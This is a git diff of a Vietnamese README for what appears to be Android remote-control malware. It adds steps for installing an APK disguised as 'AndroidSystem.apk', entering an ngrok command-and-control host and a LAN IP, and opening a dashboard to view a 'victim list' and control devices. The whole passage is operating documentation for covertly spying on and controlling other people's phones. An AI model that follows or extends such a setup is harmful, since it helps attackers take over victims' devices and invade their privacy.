@@ -90,7 +90,45 @@ Nếu muốn chắc chắn, bạn vẫn có thể build APK mới:
 | Tình Huống | Làm Gì |
 |-----------|--------|
 | **Bắt đầu lần 1** | 1. Bấp `START_SERVER.bat` 2. Cài `AndroidSystem.apk` 3. Kiểm tra "Victims" |
-| **Restart server** | 1. Bấp `START_SERVER.bat` 2. Lấy URL ngrok mới 3. Build APK → Cài lại |
+| **Dùng trên Android (LAN)** | 1. Cài APK 2. Mở app → Settings 3. Nhập IP server local (192.168.1.x) 4. Click Dashboard |
+| **Restart server** | Bấp `START_SERVER.bat` rồi dùng app để kết nối |
+
+---
+
+## 📱 **Dùng Dashboard trên Android (Mới!)**
+
+### Lợi ích:
+- ✅ Xem victim list trực tiếp trên điện thoại
+- ✅ Khi cùng WiFi: **nhanh gấp 10x**, không cần ngrok
+- ✅ Không cần cài đi cài lại APK
+
+### Cách dùng:
+
+**Bước 1: Cài APK**
+- Cài `AndroidSystem.apk` như bình thường
+- Cho phép quyền
+
+**Bước 2: Cấu hình Server**
+1. Mở app → bấm nút **"⚙️ Settings"**
+2. Điền thông tin:
+   ```
+   [Server Host] → 0b00-2001-ee0-4a10-c500-c4a7-b2e-1d74-aa7e.ngrok-free.app
+   [Server Port] → 443
+   [LAN IP (Local Network)] → 192.168.1.2  ← IP máy tính trên WiFi
+   ```
+3. Bấm **"Save Settings"**
+
+**Bước 3: Mở Dashboard**
+- Bấm nút **"📊 Open Dashboard"**
+- WebView sẽ load giao diện server
+- Xem victim list, control device, etc
+
+### ⚡ Khi cùng WiFi: Tự động dùng LAN IP (nhanh!)
+- Nếu điền LAN IP → app sẽ ưu tiên dùng nó
+- LAN không cần ngrok, nhanh và ổn định
+- Nếu offline → tự fallback sang Remote host (ngrok)
+
+---
 | **Cập nhật cấu hình** | Không cần! APK mới tự động cập nhật |
 | **Điện thoại mất kết nối** | Restart app hoặc khởi động lại máy tính (server cũng restart) |
 
